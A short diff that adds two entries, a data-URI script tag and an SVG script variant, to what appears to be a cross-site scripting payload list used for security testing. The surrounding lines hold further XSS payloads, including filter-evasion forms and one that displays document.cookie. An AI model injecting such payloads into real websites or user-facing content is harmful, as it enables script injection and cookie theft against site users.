@@ -25,6 +25,9 @@
 <script>alert('XSS');</script>
 <scr<script>ipt>alert('XSS');</scr</script>ipt>
 <script>alert(String.fromCharCode(88,83,83))</script> 
+<script src="data:text/javascript,alert(1)"></script>
+<svg><script href="data:text/javascript,alert(1)" />
+
 <script language="JavaScript">alert('XSS')</script>
 ><script>alert(document.cookie)</script> ‘””>
 <script language=”JavaScript”> alert(‘X \nS \nS’);</script>
